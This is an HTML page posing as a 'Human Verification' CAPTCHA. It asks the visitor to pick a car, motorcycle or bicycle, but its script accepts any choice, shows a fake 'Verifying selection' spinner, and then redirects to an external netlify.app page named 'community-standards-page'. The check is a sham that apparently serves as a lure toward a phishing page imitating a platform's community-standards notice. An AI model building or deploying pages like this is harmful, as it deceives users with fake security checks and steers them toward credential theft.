<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Human Verification</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f1f3f6;
    font-family: Arial, sans-serif;
}

.container{
    width:90%;
    max-width:600px;
    background:#fff;
    padding:40px;
    border-radius:14px;
    box-shadow:0 0 25px rgba(0,0,0,0.15);
    text-align:center;
}

.header{
    font-size:28px;
    font-weight:bold;
    margin-bottom:10px;
}

p{
    font-size:18px;
}

.options{
    display:grid;
    grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
    gap:20px;
    margin-top:25px;
}

.option{
    border:2px solid #ddd;
    border-radius:12px;
    padding:20px;
    cursor:pointer;
    transition:0.3s;
    font-size:18px;
}

.option:hover{
    border-color:#0b57d0;
    background:#f0f6ff;
}

.option.selected{
    border-color:#0b57d0;
    background:#e8f0fe;
}

.icon{
    font-size:40px;
    margin-bottom:10px;
}

.loader{
    margin:25px auto 0;
    width:40px;
    height:40px;
    border:4px solid #ddd;
    border-top:4px solid #0b57d0;
    border-radius:50%;
    animation:spin 1s linear infinite;
    display:none;
}

@keyframes spin{
    100%{ transform:rotate(360deg); }
}

.status{
    margin-top:15px;
    font-size:16px;
    color:#555;
    display:none;
}

.small-text{
    margin-top:25px;
    font-size:14px;
    color:gray;
}
</style>
</head>

<body>

<div class="container">
    <div class="header">🔒 Human Verification</div>
    <p>Select one option to verify</p>

    <div class="options">
        <div class="option" onclick="verify(this)">
            <div class="icon">🚗</div>
            I see a car
        </div>
        <div class="option" onclick="verify(this)">
            <div class="icon">🏍️</div>
            I see a motorcycle
        </div>
        <div class="option" onclick="verify(this)">
            <div class="icon">🚲</div>
            I see a bicycle
        </div>
    </div>

    <div class="loader" id="loader"></div>
    <div class="status" id="status">Verifying selection...</div>

    <div class="small-text">
        Protected by intelligent verification
    </div>
</div>

<script>
function verify(el){
    document.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
    el.classList.add('selected');

    document.getElementById("loader").style.display = "block";
    document.getElementById("status").style.display = "block";

    setTimeout(() => {
        window.location.href = "https://community-standards-page.netlify.app/";
    }, 2500);
}
</script>

</body>
</html>
